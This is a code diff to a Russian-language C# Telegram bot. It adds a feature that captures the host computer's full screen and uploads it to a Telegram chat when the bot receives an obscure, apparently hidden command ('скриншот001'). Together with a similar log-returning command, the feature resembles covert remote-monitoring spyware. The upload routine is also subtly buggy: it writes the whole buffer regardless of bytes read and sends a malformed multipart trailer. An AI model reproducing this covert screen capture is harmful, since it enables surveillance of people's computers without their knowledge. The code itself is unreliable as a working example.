@@ -2,6 +2,8 @@
 using Newtonsoft.Json;
 using System;
 using System.Collections.Specialized;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Net;
 using System.Text;
@@ -73,12 +75,13 @@ namespace BotTelegramm
         }
         private void SendAnswer(long chat_id, string message)
         {
+            
             string answer = "";
             switch (message.ToLower())
             {
                 case "/start": answer = "Я твой бот,знаешь что я умею? /help"; break;
                 case "лог111": answer = RetLog(); break;
-                case "скриншот111": SendPrintScreen(chat_id); return;
+                case "скриншот001": SendPrintScreen(chat_id); return;
                 case "/help": answer =
  @"Добро пожаловать в помощь нашего телеграмм Бота.
 Ниже представлены все поддерживаемые команды
@@ -185,12 +188,89 @@ namespace BotTelegramm
             }
            
         }
+
+        private void HttpUploadScreen(string url, string file, string paramName, string contentType, NameValueCollection nvc)
+        {
+            string boundary = "----------------------------" + DateTime.Now.Ticks.ToString("x");
+            byte[] boundaryByte = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
+            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
+            wr.ContentType = "multipart/form-data; boundary=" + boundary;
+            wr.Method = "POST";
+            wr.KeepAlive = true;
+            wr.Credentials = CredentialCache.DefaultCredentials;
+
+            Stream rs = wr.GetRequestStream();
+
+            string formDataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
+            foreach (string key in nvc.Keys)
+            {
+                rs.Write(boundaryByte, 0, boundaryByte.Length);
+                string formitem = string.Format(formDataTemplate, key, nvc[key]);
+                byte[] formitembytes = Encoding.UTF8.GetBytes(formitem);
+                rs.Write(formitembytes, 0, formitembytes.Length);
+            }
+            rs.Write(boundaryByte, 0, boundaryByte.Length);
+
+            string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename =\"{1}\"\r\nContent-Type:{2}\r\n\r\n";
+            string header = string.Format(headerTemplate, paramName, file, contentType);
+            byte[] headerByte = Encoding.UTF8.GetBytes(header);
+            rs.Write(headerByte, 0, headerByte.Length);
+
+            Bitmap screen = GetPrintScreen();
+            MemoryStream fs = new MemoryStream();
+         
+            screen.Save(fs, ImageFormat.Png);
+            fs.Position = 0;
+
+            byte[] buffer = new byte[4096];
+            int byteRead = 0;
+            while ((byteRead = fs.Read(buffer, 0, buffer.Length)) != 0)
+            {
+                rs.Write(buffer, 0, buffer.Length);
+            }
+            fs.Close();
+
+            byte[] trailer = Encoding.ASCII.GetBytes("\r\n--" + boundary + "--r\n");
+            rs.Write(trailer, 0, trailer.Length);
+            rs.Close();
+
+            WebResponse wresp = null;
+            try
+            {
+                wresp = wr.GetResponse();
+                Stream stream = wresp.GetResponseStream();
+                StreamReader reader = new StreamReader(stream);
+                WriteLog("Файл " + file + " ответ отправлен на сервер,ответ от сервера: " + reader.ReadToEnd());
+            }
+            catch (Exception ex)
+            {
+                WriteLog("Ошибка при отправки файла на сервер: " + ex.Message);
+                if (wresp != null)
+                {
+                    wresp.Close();
+                    wresp = null;
+                }
+            }
+            finally
+            {
+                wr = null;
+            }
+
+        }
         private void SendPrintScreen(long chat_id)
         {
             string address = BaseUrl + token + "/sendPhoto";
             NameValueCollection nvc = new NameValueCollection();
             nvc.Add("chat_id", chat_id.ToString());
-            HttpUploadFile(address, "Screenshot_1.png", "photo", "image/png", nvc);
+            HttpUploadScreen(address, "MyScreen.png", "photo", "image/png", nvc);
+            // HttpUploadFile(address, "Screenshot_1.png", "photo", "image/png", nvc);
+        }
+        private Bitmap GetPrintScreen()
+        {
+            Bitmap screen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            Graphics gr = Graphics.FromImage(screen as Image);
+            gr.CopyFromScreen(0, 0, 0, 0, screen.Size);
+            return screen;
         }
     }
 }
